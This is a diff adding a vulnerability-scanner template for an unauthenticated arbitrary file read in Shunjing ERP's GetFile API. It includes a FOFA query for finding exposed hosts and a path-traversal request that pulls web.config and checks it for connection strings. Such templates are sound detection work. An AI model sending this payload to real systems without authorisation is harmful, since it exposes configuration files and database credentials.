@@ -1,0 +1,24 @@
+id: shunjing-erp-GetFfile-fileread
+
+info:
+  name: Shunjing ERP GetFile Arbitrary File Read Vulnerability
+  author: co5mos
+  severity: high
+  description: Shunjing ERP system contains an arbitrary file read vulnerability in the /api/Download/GetFile endpoint, allowing unauthenticated attackers to read sensitive system files such as configuration files and database files.
+  metadata:
+    fofa-query: body="/api/DBRecord/getDBRecords" || body="顺景软件 WebAPI 服务端"
+  tags: lfi, shunjing, erp
+
+http:
+  - raw:
+      - |
+        GET /api/Download/GetFile?FileName=/../web.config&Title= HTTP/1.1
+        Host: {{Hostname}}
+    
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code == 200
+          - contains(body, "<configuration>")
+          - contains(body, "<connectionStrings>")
+        condition: and
